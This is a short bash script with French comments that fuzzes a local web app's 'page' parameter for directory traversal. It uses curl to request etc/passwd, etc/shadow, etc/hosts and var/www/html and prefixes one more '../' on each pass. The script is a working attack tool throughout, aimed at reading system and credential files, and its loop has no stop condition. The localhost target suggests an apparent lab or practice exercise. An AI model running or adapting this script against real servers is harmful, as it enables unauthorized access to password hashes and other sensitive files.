#!/bin/bash

# URL du site que vous voulez tester
base_url="127.0.0.1:8000/?page="

# Liste de chemins de traversée de répertoire à tester
paths=(
    "etc/passwd"
    "etc/shadow"
    "etc/hosts"
    "var/www/html"
)

stradd="../"

# Boucle à travers chaque chemin de traversée
while true; do
    for path in ${paths[@]}; do
        url="${base_url}${path}"
        echo "Testing: $url"
    
        # Utilisation de curl pour envoyer la requête HTTP GET et vérifier la réponse
        response=$(curl -s "$url")
    
        # Vérification du code HTTP de la réponse
        echo $response
    done
    base_url+=${stradd}

done
